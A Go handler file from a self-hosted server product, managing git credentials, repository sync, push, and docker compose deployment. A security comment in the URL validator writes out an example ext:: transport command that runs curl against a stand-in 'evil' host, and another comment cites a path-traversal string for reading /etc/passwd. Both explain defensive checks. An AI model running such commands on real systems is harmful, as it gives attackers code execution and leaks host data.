package handlers

import (
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"dplaned/internal/cmdutil"
)

// GitReposHandler manages multiple git-sync repositories (Arcane-style multi-repo)
type GitReposHandler struct {
	db *sql.DB
}

func NewGitReposHandler(db *sql.DB) *GitReposHandler {
	return &GitReposHandler{db: db}
}

// ─────────────────────────────────────────────
//  Credential Management
// ─────────────────────────────────────────────

// ListCredentials — GET /api/git-sync/credentials
func (h *GitReposHandler) ListCredentials(w http.ResponseWriter, r *http.Request) {
	rows, err := h.db.Query(`SELECT id, name, host, auth_type, notes, created_at,
		CASE WHEN length(token) > 0 THEN 1 ELSE 0 END as has_token,
		CASE WHEN length(ssh_key) > 0 THEN 1 ELSE 0 END as has_ssh
		FROM git_credentials ORDER BY name`)
	if err != nil {
		respondJSON(w, 500, map[string]interface{}{"success": false, "error": err.Error()})
		return
	}
	defer rows.Close()

	var creds []map[string]interface{}
	for rows.Next() {
		var id int
		var name, host, authType, notes, createdAt string
		var hasToken, hasSSH int
		rows.Scan(&id, &name, &host, &authType, &notes, &createdAt, &hasToken, &hasSSH)
		creds = append(creds, map[string]interface{}{
			"id": id, "name": name, "host": host, "auth_type": authType,
			"notes": notes, "created_at": createdAt,
			"has_token": hasToken == 1, "has_ssh": hasSSH == 1,
		})
	}
	if creds == nil {
		creds = []map[string]interface{}{}
	}
	respondJSON(w, 200, map[string]interface{}{"success": true, "credentials": creds})
}

// SaveCredential — POST /api/git-sync/credentials
func (h *GitReposHandler) SaveCredential(w http.ResponseWriter, r *http.Request) {
	var req struct {
		ID       *int   `json:"id"`
		Name     string `json:"name"`
		Host     string `json:"host"`
		AuthType string `json:"auth_type"` // "token" or "ssh"
		Token    string `json:"token"`
		SSHKey   string `json:"ssh_key"`
		Notes    string `json:"notes"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "Invalid request"})
		return
	}
	if req.Name == "" {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "name is required"})
		return
	}
	if req.Host == "" {
		req.Host = "github.com"
	}
	if req.AuthType != "token" && req.AuthType != "ssh" {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "auth_type must be token or ssh"})
		return
	}

	// For SSH: write key to file under /var/lib/dplaneos/ssh-keys/
	sshKeyPath := ""
	if req.AuthType == "ssh" && req.SSHKey != "" {
		keyDir := "/var/lib/dplaneos/ssh-keys"
		os.MkdirAll(keyDir, 0700)
		keyPath := filepath.Join(keyDir, "git-"+sanitizeName(req.Name))
		if err := os.WriteFile(keyPath, []byte(req.SSHKey), 0600); err != nil {
			respondJSON(w, 500, map[string]interface{}{"success": false, "error": "Failed to write SSH key"})
			return
		}
		sshKeyPath = keyPath
	}

	if req.ID != nil {
		// Update existing — only update token/key if non-empty (empty = keep existing)
		if req.Token != "" && req.AuthType == "token" {
			h.db.Exec(`UPDATE git_credentials SET name=?, host=?, auth_type=?, token=?, notes=? WHERE id=?`,
				req.Name, req.Host, req.AuthType, req.Token, req.Notes, *req.ID)
		} else if req.AuthType == "ssh" && sshKeyPath != "" {
			h.db.Exec(`UPDATE git_credentials SET name=?, host=?, auth_type=?, ssh_key=?, notes=? WHERE id=?`,
				req.Name, req.Host, req.AuthType, sshKeyPath, req.Notes, *req.ID)
		} else {
			h.db.Exec(`UPDATE git_credentials SET name=?, host=?, auth_type=?, notes=? WHERE id=?`,
				req.Name, req.Host, req.AuthType, req.Notes, *req.ID)
		}
		respondJSON(w, 200, map[string]interface{}{"success": true})
		return
	}

	// Insert
	sshKeyStore := sshKeyPath
	tokenStore := req.Token
	if req.AuthType == "ssh" {
		tokenStore = ""
	} else {
		sshKeyStore = ""
	}

	result, err := h.db.Exec(`INSERT INTO git_credentials (name, host, auth_type, token, ssh_key, notes) VALUES (?,?,?,?,?,?)`,
		req.Name, req.Host, req.AuthType, tokenStore, sshKeyStore, req.Notes)
	if err != nil {
		if strings.Contains(err.Error(), "UNIQUE") {
			respondJSON(w, 409, map[string]interface{}{"success": false, "error": "A credential with this name already exists"})
		} else {
			respondJSON(w, 500, map[string]interface{}{"success": false, "error": err.Error()})
		}
		return
	}
	id, _ := result.LastInsertId()
	respondJSON(w, 200, map[string]interface{}{"success": true, "id": id})
}

// TestCredential — POST /api/git-sync/credentials/test
func (h *GitReposHandler) TestCredential(w http.ResponseWriter, r *http.Request) {
	var req struct {
		CredentialID int    `json:"credential_id"`
		RepoURL      string `json:"repo_url"` // test against a specific repo
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "Invalid request"})
		return
	}
	if req.RepoURL == "" {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "repo_url required for test"})
		return
	}
	if err := validateRepoURL(req.RepoURL); err != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": err.Error()})
		return
	}

	cred, err := h.loadCredential(req.CredentialID)
	if err != nil {
		respondJSON(w, 404, map[string]interface{}{"success": false, "error": "Credential not found"})
		return
	}

	// Use git ls-remote to test connectivity without cloning
	env := buildCredentialEnv(cred)
	defer cleanupAskpass()

	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "git", "ls-remote", "--heads", req.RepoURL)
	cmd.Env = append(os.Environ(), env...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		respondJSON(w, 200, map[string]interface{}{
			"success": false,
			"error":   "Connection failed: " + strings.TrimSpace(string(out)),
			"hint":    credentialHint(cred.AuthType),
		})
		return
	}
	respondJSON(w, 200, map[string]interface{}{
		"success": true,
		"message": "Connection successful",
		"refs":    strings.TrimSpace(string(out)),
	})
}

// DeleteCredential — DELETE /api/git-sync/credentials/{id}
func (h *GitReposHandler) DeleteCredential(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Query().Get("id")
	if idStr == "" {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "id required"})
		return
	}
	h.db.Exec(`DELETE FROM git_credentials WHERE id = ?`, idStr)
	respondJSON(w, 200, map[string]interface{}{"success": true})
}

// ─────────────────────────────────────────────
//  Repo Sync Management
// ─────────────────────────────────────────────

type repoSync struct {
	ID           int    `json:"id"`
	Name         string `json:"name"`
	RepoURL      string `json:"repo_url"`
	Branch       string `json:"branch"`
	LocalPath    string `json:"local_path"`
	ComposePath  string `json:"compose_path"`
	AutoSync     bool   `json:"auto_sync"`
	SyncInterval int    `json:"sync_interval"`
	CredentialID *int   `json:"credential_id"`
	CredName     string `json:"cred_name"`
	CommitName   string `json:"commit_name"`
	CommitEmail  string `json:"commit_email"`
	LastSyncAt   string `json:"last_sync_at"`
	LastCommit   string `json:"last_commit"`
	LastError    string `json:"last_error"`
	Enabled      bool   `json:"enabled"`
}

// ListRepos — GET /api/git-sync/repos
func (h *GitReposHandler) ListRepos(w http.ResponseWriter, r *http.Request) {
	rows, err := h.db.Query(`SELECT r.id, r.name, r.repo_url, r.branch, r.local_path,
		r.compose_path, r.auto_sync, r.sync_interval,
		r.commit_name, r.commit_email,
		COALESCE(r.last_sync_at,''), COALESCE(r.last_commit,''), COALESCE(r.last_error,''),
		r.enabled, COALESCE(c.name,''), COALESCE(c.id, 0)
		FROM git_sync_repos r
		LEFT JOIN git_credentials c ON r.auth_type = 'cred' AND r.auth_token = CAST(c.id AS TEXT)
		ORDER BY r.name`)
	if err != nil {
		respondJSON(w, 500, map[string]interface{}{"success": false, "error": err.Error()})
		return
	}
	defer rows.Close()

	var repos []map[string]interface{}
	for rows.Next() {
		var id, autoSync, syncInterval, enabled, credID int
		var name, repoURL, branch, localPath, composePath,
			commitName, commitEmail, lastSyncAt, lastCommit, lastError, credName string
		rows.Scan(&id, &name, &repoURL, &branch, &localPath,
			&composePath, &autoSync, &syncInterval,
			&commitName, &commitEmail,
			&lastSyncAt, &lastCommit, &lastError,
			&enabled, &credName, &credID)

		repos = append(repos, map[string]interface{}{
			"id": id, "name": name, "repo_url": repoURL, "branch": branch,
			"local_path": localPath, "compose_path": composePath,
			"auto_sync": autoSync == 1, "sync_interval": syncInterval,
			"commit_name": commitName, "commit_email": commitEmail,
			"last_sync_at": lastSyncAt, "last_commit": lastCommit, "last_error": lastError,
			"enabled": enabled == 1, "cred_name": credName,
			"cred_id": func() interface{} {
				if credID > 0 {
					return credID
				}
				return nil
			}(),
		})
	}
	if repos == nil {
		repos = []map[string]interface{}{}
	}
	respondJSON(w, 200, map[string]interface{}{"success": true, "repos": repos})
}

// SaveRepo — POST /api/git-sync/repos
func (h *GitReposHandler) SaveRepo(w http.ResponseWriter, r *http.Request) {
	var req struct {
		ID           *int   `json:"id"`
		Name         string `json:"name"`
		RepoURL      string `json:"repo_url"`
		Branch       string `json:"branch"`
		ComposePath  string `json:"compose_path"`
		AutoSync     bool   `json:"auto_sync"`
		SyncInterval int    `json:"sync_interval"`
		CredentialID *int   `json:"credential_id"`
		CommitName   string `json:"commit_name"`
		CommitEmail  string `json:"commit_email"`
		Enabled      bool   `json:"enabled"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "Invalid request"})
		return
	}
	if req.Name == "" {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "name is required"})
		return
	}
	if req.RepoURL == "" {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "repo_url is required"})
		return
	}
	if err := validateRepoURL(req.RepoURL); err != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": err.Error()})
		return
	}
	if req.Branch == "" {
		req.Branch = "main"
	}
	if req.ComposePath == "" {
		req.ComposePath = "docker-compose.yml"
	}
	// Validate compose path to prevent path traversal — validate against a placeholder
	// root since local_path is computed from name (not stored yet)
	placeholderRoot := "/var/lib/dplaneos/git-stacks/" + sanitizeName(req.Name)
	if _, err := validateComposePath(placeholderRoot, req.ComposePath); err != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "compose_path: " + err.Error()})
		return
	}
	if req.SyncInterval < 1 {
		req.SyncInterval = 5
	}
	if req.CommitName == "" {
		req.CommitName = "D-PlaneOS"
	}
	if req.CommitEmail == "" {
		req.CommitEmail = "dplaneos@localhost"
	}

	localPath := "/var/lib/dplaneos/git-stacks/" + sanitizeName(req.Name)

	// Store credential ref as auth_token = stringified ID, auth_type = "cred"
	authType := "none"
	authToken := ""
	if req.CredentialID != nil {
		authType = "cred"
		authToken = fmt.Sprintf("%d", *req.CredentialID)
	}

	autoSyncInt := 0
	if req.AutoSync {
		autoSyncInt = 1
	}
	enabledInt := 1
	if !req.Enabled {
		enabledInt = 0
	}

	if req.ID != nil {
		h.db.Exec(`UPDATE git_sync_repos SET name=?, repo_url=?, branch=?, local_path=?,
			compose_path=?, auto_sync=?, sync_interval=?, auth_type=?, auth_token=?,
			commit_name=?, commit_email=?, enabled=? WHERE id=?`,
			req.Name, req.RepoURL, req.Branch, localPath,
			req.ComposePath, autoSyncInt, req.SyncInterval, authType, authToken,
			req.CommitName, req.CommitEmail, enabledInt, *req.ID)
		respondJSON(w, 200, map[string]interface{}{"success": true, "id": *req.ID})
		return
	}

	result, err := h.db.Exec(`INSERT INTO git_sync_repos
		(name, repo_url, branch, local_path, compose_path, auto_sync, sync_interval,
		 auth_type, auth_token, commit_name, commit_email, enabled)
		VALUES (?,?,?,?,?,?,?,?,?,?,?,?)`,
		req.Name, req.RepoURL, req.Branch, localPath,
		req.ComposePath, autoSyncInt, req.SyncInterval, authType, authToken,
		req.CommitName, req.CommitEmail, enabledInt)
	if err != nil {
		if strings.Contains(err.Error(), "UNIQUE") {
			respondJSON(w, 409, map[string]interface{}{"success": false, "error": "A sync with this name already exists"})
		} else {
			respondJSON(w, 500, map[string]interface{}{"success": false, "error": err.Error()})
		}
		return
	}
	id, _ := result.LastInsertId()
	respondJSON(w, 200, map[string]interface{}{"success": true, "id": id})
}

// DeleteRepo — DELETE /api/git-sync/repos?id=N
func (h *GitReposHandler) DeleteRepo(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Query().Get("id")
	if idStr == "" {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "id required"})
		return
	}
	// Optionally delete local clone too
	var localPath string
	h.db.QueryRow(`SELECT local_path FROM git_sync_repos WHERE id=?`, idStr).Scan(&localPath)
	h.db.Exec(`DELETE FROM git_sync_repos WHERE id=?`, idStr)
	respondJSON(w, 200, map[string]interface{}{"success": true, "local_path": localPath})
}

// PullRepo — POST /api/git-sync/repos/pull?id=N
func (h *GitReposHandler) PullRepo(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Query().Get("id")
	repo, err := h.loadRepo(idStr)
	if err != nil {
		respondJSON(w, 404, map[string]interface{}{"success": false, "error": "Repo not found"})
		return
	}

	cred, _ := h.credForRepo(repo)
	env := buildCredentialEnv(cred)
	defer cleanupAskpass()

	os.MkdirAll(filepath.Dir(repo.LocalPath), 0755)

	var out string
	var gitErr error
	if _, err := os.Stat(filepath.Join(repo.LocalPath, ".git")); err == nil {
		out, gitErr = runGitInDir(repo.LocalPath, env, "pull", "--rebase", "origin", repo.Branch)
	} else {
		out, gitErr = runGitGlobal(env, "clone", "--branch", repo.Branch, "--single-branch", repo.RepoURL, repo.LocalPath)
	}

	if gitErr != nil {
		h.db.Exec(`UPDATE git_sync_repos SET last_error=?, last_sync_at=? WHERE id=?`,
			out, time.Now().Format(time.RFC3339), idStr)
		respondJSON(w, 500, map[string]interface{}{"success": false, "error": out})
		return
	}

	commit := getHeadCommit(repo.LocalPath)
	h.db.Exec(`UPDATE git_sync_repos SET last_sync_at=?, last_commit=?, last_error='' WHERE id=?`,
		time.Now().Format(time.RFC3339), commit, idStr)
	log.Printf("GIT-REPOS: Pulled %s — %s", repo.Name, commit)
	respondJSON(w, 200, map[string]interface{}{"success": true, "commit": commit, "output": out})
}

// PushRepo — POST /api/git-sync/repos/push?id=N
// Commits current state of compose_path and pushes to remote
func (h *GitReposHandler) PushRepo(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Query().Get("id")
	var req struct {
		Message string `json:"message"`
	}
	json.NewDecoder(r.Body).Decode(&req)
	if req.Message == "" {
		req.Message = fmt.Sprintf("D-PlaneOS: stack update %s", time.Now().Format("2006-01-02 15:04"))
	}

	repo, err := h.loadRepo(idStr)
	if err != nil {
		respondJSON(w, 404, map[string]interface{}{"success": false, "error": "Repo not found"})
		return
	}
	if _, err := os.Stat(filepath.Join(repo.LocalPath, ".git")); err != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "Repository not cloned yet — pull first"})
		return
	}

	cred, _ := h.credForRepo(repo)
	env := buildCredentialEnv(cred)
	defer cleanupAskpass()

	// Configure git identity
	runGitInDir(repo.LocalPath, nil, "config", "user.name", repo.CommitName)
	runGitInDir(repo.LocalPath, nil, "config", "user.email", repo.CommitEmail)

	// Stage only the compose file (not entire repo) — validate path first
	_, pathErr := validateComposePath(repo.LocalPath, repo.ComposePath)
	if pathErr != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "compose_path: " + pathErr.Error()})
		return
	}
	runGitInDir(repo.LocalPath, nil, "add", repo.ComposePath)

	commitOut, commitErr := runGitInDir(repo.LocalPath, nil, "commit", "-m", req.Message)
	if commitErr != nil {
		if strings.Contains(commitOut, "nothing to commit") {
			respondJSON(w, 200, map[string]interface{}{"success": true, "message": "No changes to commit"})
			return
		}
		respondJSON(w, 500, map[string]interface{}{"success": false, "error": "Commit failed: " + commitOut})
		return
	}

	pushOut, pushErr := runGitInDir(repo.LocalPath, env, "push", "origin", repo.Branch)
	if pushErr != nil {
		respondJSON(w, 500, map[string]interface{}{"success": false, "error": "Push failed: " + pushOut,
			"hint": credentialHint(func() string {
				if cred != nil {
					return cred.AuthType
				}
				return "none"
			}())})
		return
	}

	commit := getHeadCommit(repo.LocalPath)
	h.db.Exec(`UPDATE git_sync_repos SET last_commit=?, last_sync_at=? WHERE id=?`,
		commit, time.Now().Format(time.RFC3339), idStr)
	log.Printf("GIT-REPOS: Pushed %s — %s", repo.Name, commit)
	respondJSON(w, 200, map[string]interface{}{"success": true, "commit": commit})
}

// DeployRepo — POST /api/git-sync/repos/deploy?id=N
// Runs docker compose up -d for the repo's compose file
func (h *GitReposHandler) DeployRepo(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Query().Get("id")
	repo, err := h.loadRepo(idStr)
	if err != nil {
		respondJSON(w, 404, map[string]interface{}{"success": false, "error": "Repo not found"})
		return
	}

	composeFull, pathErr := validateComposePath(repo.LocalPath, repo.ComposePath)
	if pathErr != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "compose_path: " + pathErr.Error()})
		return
	}
	if _, err := os.Stat(composeFull); err != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false,
			"error": fmt.Sprintf("Compose file not found at %s — pull first", composeFull)})
		return
	}

	out, err := cmdutil.RunSlow("docker", "compose", "-f", composeFull, "up", "-d", "--remove-orphans")
	if err != nil {
		respondJSON(w, 500, map[string]interface{}{"success": false, "error": string(out)})
		return
	}
	respondJSON(w, 200, map[string]interface{}{"success": true, "output": string(out)})
}

// ExportToRepo — POST /api/git-sync/repos/export?id=N
// Exports running stack as compose YAML into the repo, ready to commit
func (h *GitReposHandler) ExportToRepo(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Query().Get("id")
	var req struct {
		Containers []string `json:"containers"` // empty = all
	}
	json.NewDecoder(r.Body).Decode(&req)

	repo, err := h.loadRepo(idStr)
	if err != nil {
		respondJSON(w, 404, map[string]interface{}{"success": false, "error": "Repo not found"})
		return
	}
	if _, err := os.Stat(filepath.Join(repo.LocalPath, ".git")); err != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "Repository not cloned yet — pull first"})
		return
	}

	// Get container list
	args := []string{"inspect"}
	if len(req.Containers) > 0 {
		args = append(args, req.Containers...)
	} else {
		out, err := cmdutil.RunFast("docker", "ps", "--format", "{{.Names}}")
		if err != nil {
			respondJSON(w, 500, map[string]interface{}{"success": false, "error": "Failed to list containers"})
			return
		}
		names := strings.Split(strings.TrimSpace(string(out)), "\n")
		if len(names) == 0 || names[0] == "" {
			respondJSON(w, 200, map[string]interface{}{"success": false, "error": "No running containers"})
			return
		}
		args = append(args, names...)
	}

	inspectOut, err := cmdutil.RunMedium("docker", args...)
	if err != nil {
		respondJSON(w, 500, map[string]interface{}{"success": false, "error": "docker inspect failed"})
		return
	}

	var containers []map[string]interface{}
	if err := json.Unmarshal(inspectOut, &containers); err != nil {
		respondJSON(w, 500, map[string]interface{}{"success": false, "error": "Failed to parse inspect"})
		return
	}

	// Reuse compose generator from git_sync.go
	gsh := &GitSyncHandler{db: h.db}
	yaml := gsh.generateCompose(containers)

	// Write to repo
	composeFull, pathErr := validateComposePath(repo.LocalPath, repo.ComposePath)
	if pathErr != nil {
		respondJSON(w, 400, map[string]interface{}{"success": false, "error": "compose_path: " + pathErr.Error()})
		return
	}
	os.MkdirAll(filepath.Dir(composeFull), 0755)
	if err := os.WriteFile(composeFull, []byte(yaml), 0644); err != nil {
		respondJSON(w, 500, map[string]interface{}{"success": false, "error": "Failed to write compose file"})
		return
	}

	respondJSON(w, 200, map[string]interface{}{
		"success":  true,
		"yaml":     yaml,
		"path":     composeFull,
		"services": len(containers),
	})
}

// ─────────────────────────────────────────────
//  Internal helpers
// ─────────────────────────────────────────────

type gitCredential struct {
	ID       int
	Name     string
	Host     string
	AuthType string
	Token    string
	SSHKey   string
}

func (h *GitReposHandler) loadCredential(id int) (*gitCredential, error) {
	var c gitCredential
	err := h.db.QueryRow(`SELECT id, name, host, auth_type, token, ssh_key FROM git_credentials WHERE id=?`, id).
		Scan(&c.ID, &c.Name, &c.Host, &c.AuthType, &c.Token, &c.SSHKey)
	if err != nil {
		return nil, err
	}
	return &c, nil
}

func (h *GitReposHandler) loadRepo(idStr string) (*repoSync, error) {
	var repo repoSync
	var autoSync, enabled int
	err := h.db.QueryRow(`SELECT id, name, repo_url, branch, local_path, compose_path,
		auto_sync, sync_interval, commit_name, commit_email,
		COALESCE(last_sync_at,''), COALESCE(last_commit,''), COALESCE(last_error,''), enabled
		FROM git_sync_repos WHERE id=?`, idStr).
		Scan(&repo.ID, &repo.Name, &repo.RepoURL, &repo.Branch, &repo.LocalPath, &repo.ComposePath,
			&autoSync, &repo.SyncInterval, &repo.CommitName, &repo.CommitEmail,
			&repo.LastSyncAt, &repo.LastCommit, &repo.LastError, &enabled)
	if err != nil {
		return nil, err
	}
	repo.AutoSync = autoSync == 1
	repo.Enabled = enabled == 1
	return &repo, nil
}

func (h *GitReposHandler) credForRepo(repo *repoSync) (*gitCredential, error) {
	var credID int
	h.db.QueryRow(`SELECT CAST(auth_token AS INTEGER) FROM git_sync_repos WHERE id=? AND auth_type='cred'`, repo.ID).Scan(&credID)
	if credID == 0 {
		return nil, nil
	}
	return h.loadCredential(credID)
}

func buildCredentialEnv(cred *gitCredential) []string {
	if cred == nil {
		return nil
	}
	if cred.AuthType == "token" && cred.Token != "" {
		tokenFile, err := os.CreateTemp("", ".dplaneos-token-*")
		if err != nil {
			return nil
		}
		tokenFile.Write([]byte(cred.Token))
		tokenFile.Chmod(0600)
		tokenFile.Close()

		askpassFile, err := os.CreateTemp("", ".dplaneos-askpass-*")
		if err != nil {
			os.Remove(tokenFile.Name())
			return nil
		}
		script := fmt.Sprintf("#!/bin/sh\ncase \"$1\" in\n*Username*) echo 'x-access-token' ;;\n*) cat '%s' ;;\nesac\n", tokenFile.Name())
		askpassFile.Write([]byte(script))
		askpassFile.Chmod(0700)
		askpassFile.Close()

		return []string{
			"GIT_ASKPASS=" + askpassFile.Name(),
			"GIT_TERMINAL_PROMPT=0",
		}
	}
	if cred.AuthType == "ssh" && cred.SSHKey != "" {
		sshCmd := fmt.Sprintf("ssh -i %s -o StrictHostKeyChecking=accept-new", cred.SSHKey)
		return []string{"GIT_SSH_COMMAND=" + sshCmd}
	}
	return nil
}


// validateRepoURL validates a Git repository URL.
//
// Security: git's ext:: transport allows arbitrary command execution:
//   ext::sh -c 'curl http://evil/$HOSTNAME' → RCE as the daemon user.
// file:// allows reading local files outside the expected paths.
//
// Allowed schemes: https://, http://, git://, ssh://, git@ (SCP syntax)
// Blocked: ext::, file://, fd::, and anything that doesn't match the allowlist.
func validateRepoURL(rawURL string) error {
	if rawURL == "" {
		return fmt.Errorf("repo_url is required")
	}
	if len(rawURL) > 512 {
		return fmt.Errorf("repo_url too long (max 512 chars)")
	}

	// SCP-style git@host:path — validate before trying to parse as URL
	scpRe := regexp.MustCompile(`^[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+:[a-zA-Z0-9._/~-]`)
	if scpRe.MatchString(rawURL) {
		return nil
	}

	u, err := url.Parse(rawURL)
	if err != nil {
		return fmt.Errorf("invalid repo URL: %w", err)
	}

	switch strings.ToLower(u.Scheme) {
	case "https", "http", "git", "ssh":
		// allowed
	case "":
		return fmt.Errorf("repo URL must include a scheme (https://, ssh://, git@...)")
	default:
		return fmt.Errorf("repo URL scheme %q is not allowed (use https://, ssh://, or git@)", u.Scheme)
	}

	if u.Host == "" {
		return fmt.Errorf("repo URL must include a host")
	}

	return nil
}

func runGitInDir(dir string, env []string, args ...string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	fullArgs := append([]string{"-C", dir}, args...)
	cmd := exec.CommandContext(ctx, "git", fullArgs...)
	cmd.Env = append(os.Environ(), env...)
	out, err := cmd.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

func runGitGlobal(env []string, args ...string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	cmd := exec.CommandContext(ctx, "git", args...)
	cmd.Env = append(os.Environ(), env...)
	out, err := cmd.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

func getHeadCommit(localPath string) string {
	out, err := runGitInDir(localPath, nil, "rev-parse", "--short", "HEAD")
	if err != nil {
		return ""
	}
	return strings.TrimSpace(out)
}

func credentialHint(authType string) string {
	switch authType {
	case "token":
		return "Check that your Personal Access Token has 'repo' scope and hasn't expired. GitHub PATs: Settings → Developer settings → Personal access tokens"
	case "ssh":
		return "Check that your SSH key is added to your GitHub/Gitea account under Settings → SSH keys"
	default:
		return "This repository may require authentication. Add a credential in the Credentials tab."
	}
}

func sanitizeName(name string) string {
	var sb strings.Builder
	for _, c := range strings.ToLower(name) {
		if (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '-' || c == '_' {
			sb.WriteRune(c)
		} else {
			sb.WriteRune('-')
		}
	}
	return sb.String()
}

// validateComposePath ensures the compose file path from the user cannot escape the
// repository's local directory via path traversal (e.g. "../../etc/passwd").
//
// Rules:
//   - Must be a relative path (no leading slash)
//   - After filepath.Clean, must still be inside the repo root
//   - No null bytes
//
// Returns the cleaned, validated absolute path ready for os.Stat/WriteFile.
func validateComposePath(localPath, composePath string) (string, error) {
	if strings.ContainsRune(composePath, 0) {
		return "", fmt.Errorf("compose_path contains null byte")
	}
	if filepath.IsAbs(composePath) {
		return "", fmt.Errorf("compose_path must be relative (no leading slash)")
	}
	// filepath.Clean resolves ".." components
	cleaned := filepath.Clean(composePath)
	full := filepath.Join(localPath, cleaned)
	// After joining, the result must still be under localPath
	if !strings.HasPrefix(full+string(filepath.Separator), localPath+string(filepath.Separator)) {
		return "", fmt.Errorf("compose_path escapes repository directory (path traversal attempt)")
	}
	return full, nil
}
